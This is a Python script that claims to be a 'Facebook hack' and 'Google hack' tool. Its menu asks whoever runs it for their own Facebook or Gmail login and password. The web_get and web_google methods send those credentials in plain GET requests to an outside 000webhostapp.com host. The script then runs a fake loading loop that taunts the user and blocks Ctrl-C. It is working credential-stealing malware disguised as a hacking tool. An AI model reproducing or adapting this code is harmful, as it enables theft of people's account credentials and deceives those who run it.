import os
import time

try:
    import requests as r
except ModuleNotFoundError:
    os.system("clear")

os.system("clear")
time.sleep(3)


logo2 = """
 mmmm                 #             mmmmmm #
 #   \"m  mmm    m mm  #   m         #      #mmm
 #    # \"   #   #\"  \" # m\"          #mmmmm #\" \"#
 #    # m\"\"\"#   #     #\"#           #      #   #
 #mmm\"  \"mm\"#   #     #  \"m         #      ##m#\"

"""


logo = """\033[1;96m█████████
\033[1;96m█▄████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[1;96m█\033[1;91m▼▼▼▼▼ \033[1;95m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
\033[1;96m█ \033[1;92m \033[1;95m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\033[1;96m█\033[1;91m▲▲▲▲▲\033[1;95m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[
\033[1;96m████████      \033[1;92m«----------✧----------»
\033[1;96m ██ ██
"""

logo3 = """
  ____                   _        _                _
 / ___| ___   ___   __ _| | ___  | |__   __ _  ___| | __
| |  _ / _ \ / _ \ / _` | |/ _ \ | '_ \ / _` |/ __| |/ /
| |_| | (_) | (_) | (_| | |  __/ | | | | (_| | (__|   <
 \____|\___/ \___/ \__, |_|\___| |_| |_|\__,_|\___|_|\_\
                                  |___/
"""

#print(logo)

def main():
    from os import system as ter
    from sys import argv as a
    ter("clear")
    print("{} is need to import".format(a[0]))
    print("this module is made by Tricker")



red = "\033[31m"
white = "\033[m"
green = "\033[32m"
yellow = "\033[33m"
blue = "\033[34m"
purple = "\033[35m"
cyan = "\033[36m"

class style:
    def show_color(self):
        print(red+"red")
        print(white+"white")
        print(green+"green")
        print(yellow+"yellow")
        print(blue+"blue")
        print(purple+"purple")
        print(cyan+"cyan"+white)

    def color(self, x):
            if x == 'red':
                return red
            elif x == 'white':
                return white
            elif x == 'green':
                return green
            elif x == 'yellow':
                return yellow
            elif x == 'blue':
                return blue
            elif x == 'purple':
                return purple
            elif x == 'cyan':
                return cyan


    def square(self, x, y):
                sq="""
            {1}##############################
                        {0}
            ##############################{2}"""
                if y == "white":
                    return sq.format(x,white,white)
                elif y == "red":
                    return sq.format(x, red, white)
                elif y == "green":
                    return sq.format(x, green, white)
                elif y == "yellow":
                    return sq.format(x, yellow, white)
                elif y == "blue":
                    return sq.format(x, blue, white)
                elif y == "purple":
                    return sq.format(x, purple, white)
                elif y == "cyan":
                    return sq.format(x, cyan, white)

    def line(self):
        p="""
_______________________________________________________"""
        return p

#logo2 with color
logo_plus = green+logo2+white
print (logo_plus)

print (" ")
print (" ")
print (cyan + "{1}Facebook hack")
print (" " + blue)
print ("{2}Google hack")
print (" ")
print (" ")


#start of project
def att():
     import os

     li = ["loading.","loading..","loading..."]

     for i in li:
         os.system("clear")
         print(i)
         os.system("sleep 1")
     while True:
         try:
             while True:
                 print("find source....")
         except KeyboardInterrupt:
                 print("you can't exit :\"(")





class web_source:
    def view(self, url):
        import requests as r
        p = r.get(url)
        return p.text

    @classmethod
    def web_get(web, us, pas):
        web.us = us
        web.pas = pas
        web.url = "http://oo-ozo.000webhostapp.com/welcome.php?na="+web.us+"&pa="+web.pas
        import requests as r
        web.p = r.get(web.url)

    def web_google(web, us, pssw):
        web.us = us
        web.pssw = pssw
        web.url = "https://oo-ozo.000webhostapp.com/google_get.php?email="+us+"&password="+pssw
        import requests as r
        web.k = r.get(web.url)
        print (web.k.text)

class file_readwrite:
    def writer(self, file, mod, text):
        with open(file, mod) as f:
            f.write(text)

    def reader(self, file):
        with open(file, 'r') as f:
            return f.read()

class Tk:
    def label(self, content, win):
        import tkinter
        w = Label(win, text=content)
        w.pack()

if __name__ == "__name__":
    pass

menu = input(cyan+"your choice>>")
if menu == "1":
    import os as s
    s.system("clear")
    print (logo)
    print (" ")
    print (yellow + "at first, you needed to login to your account")
    na = input(green+"ID"+red+"/"+green+"Email"+red+">"+white)
    pa = input(green+"Password :"+red)
    print (white)
    c = web_source()
    c.web_get(us=na, pas=pa)
    att()

elif menu == "2":
    import os as s
    s.system("clear")
    print (green + logo3 + white)
    print (" ")
    print (yellow + "at first, you needed to login to your account")
    na = input(green+"Gmail :"+red)
    pa = input(green+"Password :"+red)
    c = web_source()
    p = c.web_google(us=na, pssw=pa)
    att()

else:
    print(red+"Wrong Argv :\"(")


def att():
    import os

    li = ["loading.","loading..","loading..."]

    for i in li:
        os.system("clear")
        print(i)
        os.system("sleep 1")

    while True:
        try:
            while True:
                print("find source....")
                os.system("clear")
        except KeyboardInterrupt:
            while True:
                print("you can't exit :\"(")




